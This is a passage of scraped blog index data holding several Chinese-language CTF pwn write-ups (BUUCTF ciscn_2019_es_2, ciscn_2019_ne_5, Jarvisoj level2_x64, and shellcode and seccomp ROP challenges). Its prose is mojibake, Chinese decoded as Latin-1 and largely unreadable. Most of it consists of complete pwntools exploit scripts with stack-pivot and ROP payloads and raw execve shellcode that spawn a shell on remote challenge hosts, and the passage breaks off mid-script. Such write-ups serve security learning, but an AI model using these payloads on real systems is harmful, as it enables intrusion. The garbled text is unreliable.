ä¸ºebpçš„å¤‡ä»½å·²è¢«æ›´æ”¹ï¼Œæ‰€ä»¥ebpæ¢å¤çš„å°±æ˜¯æˆ‘ä»¬å¸Œæœ›çš„æ•°æ®ï¼Œè€Œå†æ‰§è¡Œä¸€éleave; retæ—¶ï¼Œç¨‹åºæ˜¯å‡å®šebpä¸­ä¿å­˜çš„æ˜¯espçš„å¤‡ä»½ï¼Œé‚£ä¹ˆé€šè¿‡è¿™ç§æ–¹æ³•ï¼Œæˆ‘ä»¬å°±å¯ä»¥æˆåŠŸåœ°æ›´æ”¹espã€‚\nè¿™æ—¶æˆ‘ä»¬å·²ç»è®©æ ˆé¡¶æŒ‡é’ˆæŒ‡å‘äº†æˆ‘ä»¬å¸Œæœ›çš„ä½ç½®ï¼Œè¿™æ—¶ç”±äºleaveæŒ‡ä»¤ï¼Œç¨‹åºä¼šå°†æˆ‘ä»¬ä¼ªé€ çš„æ ˆé¡¶çš„ç¬¬ä¸€ä¸ªæ•°æ®popè¿›ebpï¼Œç„¶åç”±äºretæŒ‡ä»¤å†å°†ç¬¬äºŒä¸ªæ•°æ®å¼¹è¿›eipä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±åº”è¯¥åœ¨ä¼ªé€ çš„æ ˆçš„ç¬¬äºŒä¸ªæ•°æ®æ”¾å…¥systemå‡½æ•°çš„åœ°å€\nç„¶åæˆ‘ä»¬å°±å¯ä»¥å½“æ™®é€šçš„æ ˆæº¢å‡ºæ„é€ æ ˆäº†ã€‚\nsystemåé¢è·Ÿä¸ª0ï¼Œå†è·Ÿ/bin/shçš„åœ°å€å°±ğŸ†—äº†\næ³„éœ²ebp æˆ‘ä»¬çœ‹åˆ°æºç¨‹åºä¸­ï¼š\nmemset(s, 0, 0x20u); read(0, s, 0x30u); printf(\u0026#34;Hello, %s\\n\u0026#34;, s); è¿™ä¸ªså­—ç¬¦æ•°ç»„è¢«åˆå§‹åŒ–ä¸ºå…¨\\0ï¼Œæ­¤æ—¶å¦‚æœæˆ‘ä»¬å°†è¯¥æ•°ç»„æ‰€æœ‰çš„ä½éƒ½è¦†ç›–ä¸ºåƒåœ¾æ•°æ®ï¼Œé‚£ä¹ˆç”±äºæ•°ç»„ä¸­æ²¡æœ‰\\0äº†ï¼Œå®ƒå°±ä¼šæŠŠç´§è·Ÿåœ¨såé¢çš„æ•°æ®ä¸€é½æ‰“å°å‡ºæ¥ï¼Œç›´åˆ°é‡åˆ°ä¸€ä¸ª\\0ä¸ºæ­¢ã€‚\nè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯å¦‚æœæˆ‘ä»¬ä½¿ç”¨sendlineå‡½æ•°ï¼Œç¨‹åºè¯»å…¥çš„å­—ç¬¦æœ€åä¼šå¤šä¸€ä¸ª\\nï¼Œæ‰€ä»¥è¿™é‡Œå‘é€payloadåº”è¯¥ç”¨sendã€‚åŒæ—¶åœ¨payloadä¸­ä½¿ç”¨ä¸€ä¸ªä¸å‰é¢ä¸åŒçš„å­—ç¬¦åšå“¨å…µï¼š\npayload = b\u0026#34;a\u0026#34;*0x27 + b\u0026#34;b\u0026#34; p.clean() p.send(payload) ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åªè¦æ»¡è¶³ï¼š\nåˆšå¥½è¾“å…¥0x28ä¸ªæ•°æ® è¾“å…¥çš„æœ€åä¸€ä¸ªå­—ç¬¦ä¸å‰é¢è¾“å…¥çš„ä¸åŒ å°±å¯ä»¥äº†\né‚£ä¹ˆsendlineå‡½æ•°ä¹Ÿä¸æ˜¯ä¸å¯ä»¥ç”¨ï¼š\npayload = b\u0026#34;a\u0026#34;*0x27 p.clean() p.sendline(payload) ç”¨\\nå­—ç¬¦åšå“¨å…µå°±å¯ä»¥äº†ã€‚\nç„¶åæˆ‘ä»¬å°±å¯ä»¥recvebpåœ°å€äº†ï¼š\np.recvuntil(b\u0026#34;b\u0026#34;) ebp_addr = u32(p.recv(4)) # æˆ‘ä»¬å¯ä»¥è®²ç¤¼è²Œä¸€ç‚¹ï¼Œæ ˆè¿ç§»å®Œåè¿”å›åœ°å€å’ŒåŸæ¥ä¸€æ · eip_addr = u32(p.recv(4)) å¼€å§‹æ ˆè¿ç§» æˆ‘ä»¬ç”¨gdbè°ƒè¯•ä¸€ä¸‹ï¼Œå‘ç°å½“æ¢å¤ebpå¤‡ä»½å€¼çš„æ—¶å€™ï¼Œè¿™ä¸ªå¤‡ä»½å€¼æ¯”å½“æ—¶ebpçš„å€¼åˆšå¥½å¤š0x10ï¼š\né‚£ä¹ˆæˆ‘ä»¬çš„payloadå°±å‡ºæ¥äº†ï¼š\nleave_ret = 0x080484b8 # commandä¹Ÿå¯ä»¥æ˜¯cat flag command = \u0026#34;/bin/sh\u0026#34; payload = pg(ebp_addr) + pg(m_elf.plt[\u0026#39;system\u0026#39;]) + pg(eip_addr) \\ + pg(ebp_addr - 0x28) + bytes(command.ljust(0x18, \u0026#34;\\0\u0026#34;), encoding=\u0026#34;UTF-8\u0026#34;)\\ + pg(ebp_addr - 0x38) + pg(leave_ret) å®Œæ•´exp from pwn import * from pwn import p64, p32, u32, u64 # from LibcSearcher import LibcSearcher pss: bool = False fn: str = \u0026#34;./ciscn_2019_es_2\u0026#34; # libc_name:str = \u0026#34;/lib/i386-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;b* 0x80485FD\u0026#34;) else: p = process(fn) m_elf = ELF(fn) p.clean() payload1 = b\u0026#34;a\u0026#34;*0x27 p.sendline(payload1) p.recvuntil(b\u0026#34;\\n\u0026#34;) ebp_addr = u32(p.recv(4)) eip_addr = u32(p.recv(4)) success(hex(ebp_addr)) p.clean() leave_ret = 0x080484b8 command = \u0026#34;/bin/sh\u0026#34; payload = pg(ebp_addr) + pg(m_elf.plt[\u0026#39;system\u0026#39;]) + pg(eip_addr) \\ + pg(ebp_addr - 0x28) + bytes(command.ljust(0x18, \u0026#34;\\0\u0026#34;), encoding=\u0026#34;UTF-8\u0026#34;)\\ + pg(ebp_addr - 0x38) + pg(leave_ret) p.sendline(payload) p.clean() p.interactive() ","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%BE%8B%E9%A2%98%E8%A7%A3%E6%9E%90ciscn_2019_es_2/","section":"writeup","summary":"ã€æ ˆè¿ç§»ä¾‹é¢˜è§£æã€‘ã€Write-upã€‘BUUCTF ciscn_2019_es_2 åŸé¢˜é“¾æ¥ ã€æ ˆè¿ç§»ä¾‹é¢˜è§£æã€‘ã€Write-upã€‘BUUCTF ciscn_2019_es_2 checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹","tags":["pwn","æ ˆè¿ç§»"],"title":"ã€æ ˆè¿ç§»ä¾‹é¢˜è§£æã€‘ciscn_2019_es_2"},{"categories":["writeup"],"contents":"ã€Write-upã€‘BUUCTF ciscn_2019_ne_5 åŸé¢˜é“¾æ¥\nã€Write-upã€‘BUUCTF ciscn_2019_ne_5 checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ç¨‹åºä¼ªä»£ç  æ„å»ºexp checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ $ checksec --file ciscn_2019_ne_5 [*] \u0026#39;/home/peterl/security/workspace/ciscn_2019_ne_5/ciscn_2019_ne_5\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) idaæŸ¥çœ‹ç¨‹åºä¼ªä»£ç  int __cdecl main(int argc, const char **argv, const char **envp) { int result; // eax int v4; // [esp+0h] [ebp-100h] BYREF char src[4]; // [esp+4h] [ebp-FCh] BYREF char v6[124]; // [esp+8h] [ebp-F8h] BYREF char s1[4]; // [esp+84h] [ebp-7Ch] BYREF char v8[96]; // [esp+88h] [ebp-78h] BYREF int *v9; // [esp+F4h] [ebp-Ch] v9 = \u0026amp;argc; setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); fflush(stdout); *(_DWORD *)s1 = 48; memset(v8, 0, sizeof(v8)); *(_DWORD *)src = 48; memset(v6, 0, sizeof(v6)); puts(\u0026#34;Welcome to use LFS.\u0026#34;); printf(\u0026#34;Please input admin password:\u0026#34;); __isoc99_scanf(\u0026#34;%100s\u0026#34;, s1); if ( strcmp(s1, \u0026#34;administrator\u0026#34;) ) { puts(\u0026#34;Password Error!\u0026#34;); exit(0); } puts(\u0026#34;Welcome!\u0026#34;); puts(\u0026#34;Input your operation:\u0026#34;); puts(\u0026#34;1.Add a log.\u0026#34;); puts(\u0026#34;2.Display all logs.\u0026#34;); puts(\u0026#34;3.Print all logs.\u0026#34;); printf(\u0026#34;0.Exit\\n:\u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;v4); switch ( v4 ) { case 0: exit(0); return result; case 1: AddLog(src); result = sub_804892B(argc, argv, envp); break; case 2: Display(src); result = sub_804892B(argc, argv, envp); break; case 3: Print(); result = sub_804892B(argc, argv, envp); break; case 4: GetFlag(src); result = sub_804892B(argc, argv, envp); break; default: result = sub_804892B(argc, argv, envp); break; } return result; } é¦–å…ˆæˆ‘ä»¬æ‰¾åˆ°äº†å¯†ç ä¸ºadministratorï¼Œç„¶åæˆ‘ä»¬çœ‹åˆ°ä¸‹é¢çš„switch-caseè¯­å¥\nç»è¿‡åˆ†ææˆ‘ä»¬å‘ç°åªæœ‰å½“caseä¸º1æ—¶èƒ½å¤Ÿè¾“å…¥128ä¸ªå­—ç¬¦ï¼š\nä½†æ˜¯ä¿å­˜è¾“å…¥çš„å˜é‡ä¸åœ¨å½“å‰æ ˆä¸­ï¼Œè€Œä¸”åœ¨åŸæœ¬çš„mainå‡½æ•°ä¸­ä¼ å…¥çš„å‚æ•°ä¹Ÿåªæ˜¯ä¸€ä¸ªä¿å­˜åœ°å€çš„4å­—èŠ‚å˜é‡ï¼Œå› æ­¤å¯¹åŸæœ¬çš„mainå‡½æ•°ä¹Ÿæ„æˆä¸äº†æº¢å‡ºã€‚\nä½†æ˜¯æˆ‘ä»¬åˆå‘ç°ï¼Œæˆ‘ä»¬åœ¨srcå˜é‡æ‰€æŒ‡çš„å†…å­˜ä¸­ä¿å­˜çš„æ•°æ®ä¼šè¢«åˆ«çš„å‡½æ•°åˆ©ç”¨ï¼š\nåŒæ—¶æˆ‘ä»¬å‘ç°pltè¡¨ä¸­æœ‰systemï¼š\n$ readelf -r ciscn_2019_ne_5 é‡å®šä½èŠ‚ \u0026#39;.rel.dyn\u0026#39; at offset 0x3c4 contains 4 entries: åç§»é‡ ä¿¡æ¯ ç±»å‹ ç¬¦å·å€¼ ç¬¦å·åç§° 08049ff0 00000506 R_386_GLOB_DAT 00000000 stderr@GLIBC_2.0 08049ff4 00000906 R_386_GLOB_DAT 00000000 __gmon_start__ 08049ff8 00000c06 R_386_GLOB_DAT 00000000 stdin@GLIBC_2.0 08049ffc 00000d06 R_386_GLOB_DAT 00000000 stdout@GLIBC_2.0 é‡å®šä½èŠ‚ \u0026#39;.rel.plt\u0026#39; at offset 0x3e4 contains 10 entries: åç§»é‡ ä¿¡æ¯ ç±»å‹ ç¬¦å·å€¼ ç¬¦å·åç§° 0804a00c 00000107 R_386_JUMP_SLOT 00000000 setbuf@GLIBC_2.0 0804a010 00000207 R_386_JUMP_SLOT 00000000 strcmp@GLIBC_2.0 0804a014 00000307 R_386_JUMP_SLOT 00000000 printf@GLIBC_2.0 0804a018 00000407 R_386_JUMP_SLOT 00000000 fflush@GLIBC_2.0 0804a01c 00000607 R_386_JUMP_SLOT 00000000 strcpy@GLIBC_2.0 0804a020 00000707 R_386_JUMP_SLOT 00000000 puts@GLIBC_2.0 0804a024 00000807 R_386_JUMP_SLOT 00000000 system@GLIBC_2.0 0804a028 00000a07 R_386_JUMP_SLOT 00000000 exit@GLIBC_2.0 0804a02c 00000b07 R_386_JUMP_SLOT 00000000 __libc_start_main@GLIBC_2.0 0804a030 00000e07 R_386_JUMP_SLOT 00000000 __isoc99_scanf@GLIBC_2.7 åœ¨è¿™é¢˜ä¸­Displayå‡½æ•°æ²¡æœ‰ç”¨ï¼Œä½†æ˜¯å¦‚æœé¢˜ç›®çš„pltè¡¨ä¸­systemå‡½æ•°å°±å¯ä»¥é€šè¿‡Displayå‡½æ•°æ³„éœ²åŸºå€æ¥ret2libcã€‚\nè¿™é‡Œæˆ‘ä»¬çœ‹åˆ°æˆ‘ä»¬è¾“å…¥çš„æ•°æ®åœ¨GetFlagå‡½æ•°ä¸­ä¼šè¢«strcpyä¿å­˜åœ¨å®ƒæ ˆä¸­çš„ä¸€ä¸ªå˜é‡ä¸­ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é—´æ¥åœ°æ ˆæº¢å‡ºäº†\næ„å»ºexp from pwn import * from pwn import p64, p32, u32, u64 # from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./ciscn_2019_ne_5\u0026#34; libc_name:str = \u0026#34;/lib/i386-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;25151\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;break main\u0026#34;) else: p = process(fn,env={\u0026#34;LD_PRELOAD\u0026#34;:libc_name}) m_elf = ELF(fn) bin_sh = 0x80482EA p.clean() p.sendline(b\u0026#34;administrator\u0026#34;) p.clean() p.sendline(b\u0026#34;1\u0026#34;) payload = b\u0026#34;a\u0026#34;*(0x48 + 0x4) + \\ pg(m_elf.plt[\u0026#39;system\u0026#39;]) \\ + pg(m_elf.plt[\u0026#39;exit\u0026#39;]) + pg(bin_sh) p.sendline(payload) p.clean() p.sendline(b\u0026#39;4\u0026#39;) p.clean() p.interactive() ","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/ciscn_2019_ne_5/","section":"writeup","summary":"ã€Write-upã€‘BUUCTF ciscn_2019_ne_5 åŸé¢˜é“¾æ¥ ã€Write-upã€‘BUUCTF ciscn_2019_ne_5 checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ç¨‹åºä¼ªä»£ç  æ„å»ºexp checksec","tags":["pwn"],"title":"BUUCTF ciscn_2019_ne_5"},{"categories":["writeup"],"contents":"ã€Write-upã€‘BUUCTF Jarvisoj_level2_x64 åŸé¢˜é“¾æ¥\nã€Write-upã€‘BUUCTF Jarvisoj_level2_x64 checksec æŸ¥çœ‹æ¶æ„ ida æŸ¥çœ‹ä¼ªä»£ç  æ„å»º exp å®Œæ•´ exp checksec æŸ¥çœ‹æ¶æ„ $ checksec --file level2_x64 [*] \u0026#39;/home/peterl/security/workspace/level2_x64/level2_x64\u0026#39; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) çœ‹æ¥è¯¥ç¨‹åºæ˜¯ 64 ä½çš„ï¼Œè€Œä¸”å› ä¸º NX ä¸èƒ½ä½¿ç”¨ shellcode\nåŒæ—¶ï¼Œ64 ä½ç³»ç»Ÿè°ƒç”¨ system è¿˜è¦æ³¨æ„æ ˆå¯¹é½çš„æƒ…å†µï¼Œè¦å‡†å¤‡ä¸€ä¸ªretçš„ gadget\nida æŸ¥çœ‹ä¼ªä»£ç  æˆ‘ä»¬å…ˆè¿è¡Œä¸€ä¸‹åº·åº·ï¼š\n$ ./level2_x64 Input: Hello World! çœ‹æ¥æœ‰ä¸€ä¸ªè¾“å…¥å£ï¼Œæœ‰æœºä¼šæ ˆæº¢å‡ºï¼Œæˆ‘ä»¬ç”¨ ida çœ‹çœ‹\nè¿™ä¸ªvulnerable_functionå±å®æ˜¯æœ‰ç‚¹å¤§æ‘‡å¤§æ‘†äº†\nç‚¹è¿›å»åº·åº·ï¼š\nè¿™æ˜æ‘†ç€æ˜¯è¦æ ˆæº¢å‡ºç„¶åè°ƒç”¨ plt è¡¨ä¸­çš„ system å‡½æ•°\næ„å»º exp å¯»æ‰¾ system å‡½æ•°åœ°å€ï¼š\nè¦æ³¨æ„çš„æ˜¯ï¼Œç›´æ¥ç”¨readelf -r level2_x64å‘½ä»¤è¯»åˆ°çš„æ˜¯.rela.plt çš„ç¬¦å·è¡¨ï¼ˆæ¶‰åŠåˆ°å»¶è¿Ÿç»‘å®šæœºåˆ¶ï¼Œå…·ä½“å¯ä»¥çœ‹è¿™ç¯‡åšæ–‡ï¼‰\nå¯»æ‰¾\u0026quot;\\bin\\sh\u0026quot;ï¼š\n$ ROPgadget --binary level2_x64 --string \u0026#34;/bin/sh\u0026#34; Strings information ============================================================ 0x0000000000600a90 : /bin/sh è¿˜å¥½æœ‰ç°æˆçš„ï¼Œä¸ç”¨è‡ªå·±å»æ„å»ºäº†\nå¯»æ‰¾ä¸¤ä¸ª gadgetï¼š\n$ ROPgadget --binary level2_x64 --only \u0026#34;pop|ret\u0026#34; Gadgets information ============================================================ 0x00000000004006ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret 0x00000000004006ae : pop r13 ; pop r14 ; pop r15 ; ret 0x00000000004006b0 : pop r14 ; pop r15 ; ret 0x00000000004006b2 : pop r15 ; ret 0x00000000004006ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret 0x00000000004006af : pop rbp ; pop r14 ; pop r15 ; ret 0x0000000000400560 : pop rbp ; ret 0x00000000004006b3 : pop rdi ; ret 0x00000000004006b1 : pop rsi ; pop r15 ; ret 0x00000000004006ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret 0x00000000004004a1 : ret Unique gadgets found: 11 å¯ä»¥æ‰¾åˆ°pop rdi;retå’Œretï¼š\n0x00000000004006b3 : pop rdi ; ret 0x00000000004004a1 : ret ç„¶åæˆ‘ä»¬å°±å¯ä»¥æ„å»º exp äº†\næ³¨æ„ï¼Œæˆ‘ä»¬åœ¨ä¸€å¼€å§‹å¯ä»¥ä¸åŠ retï¼Œè¯•è¿‡ä¸€æ¬¡å¦‚æœå‡ºç° EOF å†åŠ ï¼Œå¦‚æœåŠ äº†è¿˜æ˜¯æŠ¥é”™å°±è¯´æ˜ä¸æ˜¯æ ˆå¯¹é½çš„é—®é¢˜\nå®Œæ•´ exp from pwn import * from pwn import p64, p32 pss: bool = False fn: str = \u0026#34;./level2_x64\u0026#34; libc_name:str = \u0026#34;/lib/x86_64-linux-gnu/libdl.so.2\u0026#34; port: str = \u0026#34;\u0026#34; if_32: bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: p = process(fn,env={\u0026#34;LD_PRELOAD\u0026#34;:\u0026#34;/lib/x86_64-linux-gnu/libdl.so.2\u0026#34;}) ret = 0x4004a1 pop_rdi_ret = 0x4006b3 bin_sh = 0x600a90 system_addr = 0x4004c0 p.recvuntil(b\u0026#34;Input:\\n\u0026#34;) payload = b\u0026#34;a\u0026#34;*0x88 + pg(ret) + pg(pop_rdi_ret) + pg(bin_sh) + pg(system_addr) p.sendline(payload) p.interactive() ","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/jarvisoj_level2_x64/","section":"writeup","summary":"ã€Write-upã€‘BUUCTF Jarvisoj_level2_x64 åŸé¢˜é“¾æ¥ ã€Write-upã€‘BUUCTF Jarvisoj_level2_x64 checksec æŸ¥çœ‹æ¶æ„ ida æŸ¥çœ‹ä¼ªä»£ç  æ„å»º exp å®Œæ•´ exp checksec æŸ¥çœ‹æ¶æ„ $ checksec --file level2_x64 [*] \u0026#39;/home/peterl/security/workspace/level2_x64/level2_x64\u0026#39; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found","tags":["pwn"],"title":"BUUCTF Jarvisoj_level2_x64"},{"categories":["writeup"],"contents":"åŸé¢˜é“¾æ¥\nEasyEasyEasy å› ä¸ºè¯»å…¥çš„æ˜¯ä¸€ä¸ªæœ‰ç¬¦å·æ•°ï¼Œæ‰€ä»¥å½“è¾“å…¥-1 çš„æ—¶å€™ä¹Ÿæ˜¯åˆæ³•çš„\nè€Œæˆ‘ä»¬çŸ¥é“ï¼Œ-1%256 ä¹Ÿæ˜¯-1ï¼Œè€Œv5[-1]æ„ä¸º*(v5-1)ï¼ŒæŒ‡å‘ v5 å‰é¢ä¸€ä¸ªæ•°ï¼Œè€Œè¯¥ç¨‹åºåªå°† v5 åé¢çš„ 0x100 ä¸ªæ•°ç½®é›¶ï¼Œæ‰€ä»¥å‰ä¸€ä¸ªæ•°ä»å¯èƒ½ä¸ºéé›¶ã€‚\näº‹å®è¯æ˜ç¡®å®å¦‚æ­¤ï¼Œç›´æ¥ nc è¿›å»è¾“å…¥-1 å³å¯\nç®€å•çš„æ ˆæº¢å‡º æ£€æŸ¥ç¨‹åºæ¶æ„ æŸ¥çœ‹ ida åç¼–è¯‘ä»£ç  é™åˆ¶ä¸€æ¬¡è¾“å…¥å¾—åˆ° shell æƒé™\næ€è·¯ä¸€ï¼šçˆ†ç ´æ ˆåœ°å€åå››ä½ å…ˆå†™å…¥ shellcodeï¼Œç„¶åè¦æŠŠ ret å€¼è¦†ç›–ä¸º shellcode åœ°å€å³æ ˆåœ°å€ï¼Œä½†æ˜¯é™åˆ¶ä¸€æ¬¡è¾“å…¥ï¼Œè€Œä¸”æ²¡æœ‰è¾“å‡ºå‡½æ•°ï¼Œæ— æ³•æ³„éœ²æ ˆåœ°å€ã€‚ è¿™æ—¶å€™åœ¨ ret å€¼çš„ä¸‹é¢å››é¡¹çš„ä½ç½®ä¿å­˜äº†ä¸€ä¸ªæ ˆåœ°å€ï¼š\nä½†æ˜¯è¿™ä¸ªå€¼çš„å€’æ•°ç¬¬ä¸‰ä½å’Œ shellocde åœ°å€ä¸€å®šæ˜¯ä¸åŒçš„ æ‰€ä»¥æˆ‘ä»¬å°è¯•çˆ†ç ´æ ˆåœ°å€æœ«å››ä½\nå› ä¸ºæ ˆåœ°å€çš„æœ€åä¸€ä½æ˜¯ä¸å˜çš„ï¼Œæ‰€ä»¥å‡†ç¡®æ¥è¯´åªç”¨çˆ†ç ´ä¸‰ä½ gets ä¼šå°†è¾“å…¥çš„\\n æ”¹ä¸º\\x00ï¼Œæ‰€ä»¥ payload åªèƒ½è¦†ç›–åˆ°æœ«äºŒä½ï¼Œå€’æ•°ä¸‰å››ä½åªèƒ½è¦†ç›–ä¸º\\x00\nfrom pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./chall\u0026#34; libc_name:str = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;10072\u0026#34; if_32: bool = False if_debug:bool = True pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) while True: if pss: p = remote(\u0026#34;43.248.98.206\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x40054F c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) # libc = ELF(libc_name) pop_rdi_ret = 0x00000000004005e3 ret = 0x000000000040028d shellcode = asm(shellcraft.sh()) print(hex(len(shellcode))) payload = shellcode + b\u0026#34;\\x00\u0026#34;*(0x8) + pg(ret)*4 + p8(0x00) p.clean() p.sendline(payload) p.clean() p.sendline() try: p.recv(timeout=0.25) p.interactive() except: p.close() æ€è·¯äºŒï¼šåˆ©ç”¨jmp raxæˆ–call rax æˆ‘ä»¬æŠŠæ–­ç‚¹è®¾åœ¨leave;retä¸Šï¼Œgdb è¿‡å»ä¼šå‘ç° rax çš„å€¼åˆšå¥½æ˜¯æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²çš„åœ°å€\né‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨jmp raxæˆ–call raxè·³è½¬åˆ° shellcode\nå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œå¦‚æœä½¿ç”¨ pwntools ç”Ÿæˆçš„ shellcodeï¼Œå› ä¸ºæœ‰ä¸ƒä¸ª pushï¼Œæ‰€ä»¥ rsp ä¼šä¸Šç§»ï¼Œè€Œ shellcode ä¹Ÿæ˜¯å­˜åœ¨æ ˆä¸Šçš„ï¼Œè¿™æ—¶å°±ä¼šè¦†ç›–ä¸€éƒ¨åˆ† shellcode\nè§£å†³åŠæ³•æœ‰ä¸¤ä¸ªï¼š\nä½¿ç”¨æ›´çŸ­çš„ shellcode shellcode = b\u0026#39;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\u0026#39; åœ¨è·³è½¬åˆ° shellcode å‰ä½¿ rsp ä¸‹ç§» payload = shellcode.ljust(0x38, b\u0026#34;a\u0026#34;) + pg(ret)*0x5 + pg(call_rax) å®Œæ•´ expï¼š\nfrom pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = False fn: str = \u0026#34;./chall\u0026#34; libc_name:str = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;10072\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) # while True: if pss: p = remote(\u0026#34;43.248.98.206\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x40054F c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) # libc = ELF(libc_name) ret = 0x000000000040028d jmp_rax = 0x0000000000400485 call_rax = 0x000000000040051e shellcode = b\u0026#39;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\u0026#39; shellcode = asm(shellcraft.amd64.linux.sh()) print(disasm(shellcode)) print(hex(len(shellcode))) payload = shellcode.ljust(0x38, b\u0026#34;a\u0026#34;) + pg(ret)*0x5 + pg(call_rax) p.clean() p.sendline(payload) p.clean() p.interactive() babyrop æ­¤é¢˜éœ€è¦çš„ libc ç‰ˆæœ¬åªèƒ½ç”¨ ubuntu22 æŸ¥çœ‹ç¨‹åºæ¶æ„ï¼š\næŸ¥çœ‹ ida åç¼–è¯‘ä»£ç ï¼š\næœ‰æ²™ç®±æŠŠ execve çš„ç³»ç»Ÿè°ƒç”¨ç»™ç¦äº†ï¼ˆï¼šè°¢è°¢ä½ \nåŸºæœ¬æ€è·¯å°±æ˜¯åœ¨æ ˆä¸Šä¿å­˜\u0026quot;./flag\\x00\\x00\u0026quot;å­—ç¬¦ä¸²ï¼Œç„¶åé€šè¿‡ openã€readã€write çš„ç³»ç»Ÿè°ƒç”¨è¯»åˆ° flag\nä¸»è¦éš¾ç‚¹æ˜¯è·å¾—./flag å­—ç¬¦ä¸²çš„æ ˆåœ°å€ï¼ˆæœ¬é¢˜ bss æ®µé•¿åº¦ä¸å¤Ÿï¼Œå­˜ä¸äº† flag å­—ç¬¦ä¸²ï¼‰\nè¦ç‚¹æ˜¯ç”¨mov rdi, rsp; add rdi, 0x40æŒ‡å‘ payload æœ«å°¾ï¼Œåœ¨æœ«å°¾ä¿å­˜ flag å­—ç¬¦ä¸²\nç„¶åè°ƒç”¨ä¾æ¬¡è°ƒç”¨ 0x2ã€0x0ã€0x1 å·ç³»ç»Ÿè°ƒç”¨ï¼ˆopenã€readã€writeï¼‰\næ‰€æœ‰çš„ç³»ç»Ÿè°ƒç”¨ç¼–å·åœ¨æ­¤\nfrom pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./baby_rop\u0026#34; libc_name:str = \u0026#34;/lib/x86_64-linux-gnu/libseccomp.so.2\u0026#34; port: str = \u0026#34;10076\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) # while True: if pss: p = remote(\u0026#34;43.248.98.206\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x40131C c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 